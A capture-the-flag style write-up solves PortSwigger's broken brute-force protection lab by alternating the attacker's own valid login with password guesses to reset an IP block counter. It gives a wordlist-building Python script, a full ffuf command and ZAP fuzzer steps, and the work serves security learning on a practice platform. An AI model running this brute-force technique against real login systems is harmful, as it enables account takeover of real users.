# Broken Brute-Force Protection — IP Block

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.
> Covers both ZAP Fuzzer and ffuf methods — both confirmed working.

---

## Goal

Brute-force the victim's password, then log in and access their account page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

---

## Lab

https://portswigger.net/web-security/authentication/other-mechanisms/lab-broken-brute-force-protection-ip-block

---

## OWASP Category

A07:2021 – Identification and Authentication Failures

---

## Core Concept

The application blocks an IP after a few failed login attempts. This sounds secure — but the implementation has a logic flaw:

```
Failed attempt counter logic:
IF failed_attempts >= limit:
    BLOCK ip
IF login SUCCESSFUL:
    RESET failed_attempts counter to 0
                ↑
        This is the flaw!
```

If we have **our own valid credentials** (`wiener:peter`), we can log in successfully every few attempts to **reset the failed counter** before it reaches the block threshold — allowing unlimited brute-force attempts against the victim's account.

```
Attempt 1: carlos / wrongpass1   → fail (counter = 1)
Attempt 2: carlos / wrongpass2   → fail (counter = 2)
Attempt 3: wiener / peter        → SUCCESS → counter resets to 0 
Attempt 4: carlos / wrongpass3   → fail (counter = 1 again)
Attempt 5: carlos / wrongpass4   → fail (counter = 2 again)
Attempt 6: wiener / peter        → SUCCESS → counter resets to 0 
...repeat forever, never get blocked
```

The core idea for **both methods below** is identical: build one combined wordlist where the request body already contains the full `username=...&password=...` pair, interleaved so a `wiener:peter` reset appears every 2 `carlos` guesses. Then fuzz that **single combined line** as one payload — not username and password as two separate positions (which would run every combination instead of the synchronized pattern we need).

---

## Steps to Solve

---

**Step 1 — Confirm the IP Block**

Try logging in as `carlos` with wrong passwords 3-4 times in a row:

```
carlos / wrong1
carlos / wrong2
carlos / wrong3
carlos / wrong4
```

After a few attempts:
```
"You have made too many incorrect login attempts. Please try again in X minutes."
```

<img width="948" height="506" alt="image" src="https://github.com/user-attachments/assets/cd33c584-703d-401b-b56b-ea681a0fcf1b" />

---

**Step 2 — Confirm Login Resets the Counter**

Wait for the block to clear, then log in successfully with your own credentials:

```
wiener / peter
```

Then immediately try `carlos` again with a wrong password — if it does NOT immediately re-block, the counter reset is confirmed.

---

**Step 3 — Build the Combined Wordlist (bodies.txt)**

This single file is used by **both** ZAP and ffuf below. Each line is a complete POST body, alternating `carlos` guesses with a `wiener:peter` reset every two attempts:

```python
passwords = """123456 password 12345678 qwerty 123456789 12345 1234 111111 1234567 dragon 123123 baseball abc123 football monkey letmein shadow master 666666 qwertyuiop 123321 mustang 1234567890 michael 654321 superman 1qaz2wsx 7777777 121212 000000 qazwsx 123qwe killer trustno1 jordan jennifer zxcvbnm asdfgh hunter buster soccer harley batman andrew tigger sunshine iloveyou 2000 charlie robert thomas hockey ranger daniel starwars klaster 112233 george computer michelle jessica pepper 1111 zxcvbn 555555 11111111 131313 freedom 777777 pass maggie 159753 aaaaaa ginger princess joshua cheese amanda summer love ashley nicole chelsea biteme matthew access yankees 987654321 dallas austin thunder taylor matrix mobilemail mom monitor monitoring montana moon moscow""".split()

with open('bodies.txt', 'w') as out:
    for i, pwd in enumerate(passwords):
        out.write(f"username=carlos&password={pwd}\n")
        if (i + 1) % 2 == 0:
            out.write("username=wiener&password=peter\n")

print(f"Total lines written: {len(passwords) + len(passwords)//2}")
```

Resulting `bodies.txt` (150 lines total):

```
username=carlos&password=123456
username=carlos&password=password
username=wiener&password=peter
username=carlos&password=12345678
username=carlos&password=qwerty
username=wiener&password=peter
username=carlos&password=123456789
username=carlos&password=12345
username=wiener&password=peter
... (continues for all 100 candidate passwords)
```

Verify before using:
```bash
wc -l bodies.txt    # should show 150
head -10 bodies.txt
```

<img width="566" height="332" alt="image" src="https://github.com/user-attachments/assets/0e46fd10-aba7-4f0e-ab56-651bf67395b9" />

---

## Method A — ffuf (CLI)

**Step 4A — Run ffuf with the Whole Body as One Fuzz Position**

```bash
ffuf -w ./bodies.txt -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d FUZZ \
     -u https://lab-id.web-security-academy.net/login \
     -t 1 -mc 302
```

**Flag reference:**

| Flag | Meaning |
|------|---------|
| `-w ./bodies.txt` | Wordlist — no `:KEYWORD` needed, defaults to `FUZZ` |
| `-d FUZZ` | Entire POST body is the `FUZZ` keyword — each line replaces it whole |
| `-t 1` | **1 thread** — forces strictly sequential requests (critical for the interleave to hold) |
| `-mc 302` | Match only `302 Found` responses — the successful login redirect |

> **Confirmed working command** — running this exact command against the lab instance returned the successful `carlos` login as the single `302` match.

<img width="1149" height="181" alt="image" src="https://github.com/user-attachments/assets/9cceb3c8-7edb-4d06-81dd-4903b38fa108" />

**Step 5A — Read the Result**

ffuf prints the matching line directly to the terminal:

```
username=carlos&password=freedom   [Status: 302, Size: ..., Words: ..., Lines: ...]
```

Password found: **freedom**

---

## Method B — ZAP Fuzzer (GUI)

**Step 4B — Mark the Entire Body as One Payload Position**

Intercept a login POST request in ZAP, right-click → **Attack → Fuzz**. In the Fuzzer Locations tab, highlight the **whole body value** and mark it as the single fuzz position:

```http
§username=carlos&password=pepper§
```

> The key insight that makes this work: select and highlight the **entire** `username=...&password=...` line as one block, not the username and password values separately. This way ZAP treats it as a single substitution point.

<img width="1083" height="487" alt="image" src="https://github.com/user-attachments/assets/1cbc50fc-cbfb-4533-9525-cc43dcb6ec3b" />

**Step 5B — Add bodies.txt as the Payload**

```
Add Payload → Type: File
Select: bodies.txt (the same 150-line file generated in Step 3)
```

<img width="452" height="615" alt="image" src="https://github.com/user-attachments/assets/292aa3ca-e3ae-4709-98c2-513e177e0595" />

**Step 6B — Force Sequential Order**

```
Fuzzer dialog → Options tab
→ Threads per scan = 1
```

This is required for the same reason as `-t 1` in ffuf — without it, requests can fire out of order and break the interleave pattern, causing an early IP block.

<img width="1081" height="419" alt="image" src="https://github.com/user-attachments/assets/3a0a9eed-2178-42e1-b5ed-ff64ce6b70ee" />

Click **Start Fuzzer**.

**Step 7B — Identify the Successful Login**

Sort results by the **Code** column. The `302` row's **Payloads** column shows the winning line.

<img width="1876" height="153" alt="image" src="https://github.com/user-attachments/assets/29ad08b8-6280-48f0-98a5-75579fb8dead" />

Password found: **freedom**

---

## Step 8 — Log In as Carlos

Either method gets you to the same result:

```
Username: carlos
Password: freedom
```

---

**Lab Solved**

<img width="1525" height="669" alt="image" src="https://github.com/user-attachments/assets/0e18dde0-f26e-4e67-9e92-5e6de3edf377" />

---

## Why the "Whole Line as One Position" Trick Matters

The reason both methods work cleanly is the same root fix: instead of asking the tool to fuzz `username` and `password` as two independent positions (which would test every username against every password — a cluster bomb, not what we want), we collapse the entire pair into **one substitution value** per line. The tool just swaps the whole body string in and out, request after request, in the exact order the file specifies. The synchronization is baked into the wordlist itself, not into the tool's fuzzing logic.

```
Wrong approach (2 positions):           Right approach (1 position):
username=§USER§&password=§PASS§         §username=carlos&password=123456§
  → tries ALL user×pass combos            → one full line, swapped as-is
  → no synchronized reset pattern         → reset pattern lives in the file
```

---

## ffuf vs ZAP Method Comparison

| | ffuf Method | ZAP Method |
|--|--|--|
| Interleave technique | Same `bodies.txt` file | Same `bodies.txt` file |
| Sequential enforcement | `-t 1` flag | `Threads per scan = 1` in Options |
| Payload position | `-d FUZZ` (whole body) | Highlight whole body line, mark as one position |
| Filter for success | `-mc 302` flag | Sort GUI results by `Code` column |
| Result location | Printed directly to terminal | `Payloads` column in results table |
| Best for | CLI scripting, speed | GUI-driven, visual inspection |
| Confirmed working | Yes | Yes |

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
